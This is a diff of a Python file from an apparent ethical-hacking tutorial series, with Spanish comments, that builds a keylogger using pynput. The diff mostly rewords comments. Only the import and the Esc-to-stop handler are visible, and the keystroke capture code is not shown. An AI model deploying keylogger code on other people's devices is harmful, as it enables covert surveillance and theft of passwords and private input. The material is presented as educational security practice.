@@ -1,10 +1,11 @@
 '''
 PROYECTOS DE HACKING ETICO WITH PYTHON
-KEYLOGGER
+KEYLOGGER CON PYTHON
 '''
-# Este proyecto implica crear un keylogger, una herramienta que registra las pulsaciones del teclado.
 
-# Descripción: Utiliza la librería pynput para capturar las pulsaciones del teclado y registrarlas en un archivo.
+# Este proyecto implica la creación de un keylogger para registrar las teclas presionadas.
+
+# Utilizando la biblioteca pynput, el siguiente código captura y almacena las entradas del teclado en un archivo.
 
 from pynput import keyboard
 
@@ -22,6 +23,7 @@ def on_press(key):
 # Función para detener el keylogger
 def on_release(key):
     if key == keyboard.Key.esc:
+        # Detener el keylogger
         return False
 
 # Iniciar el keylogger
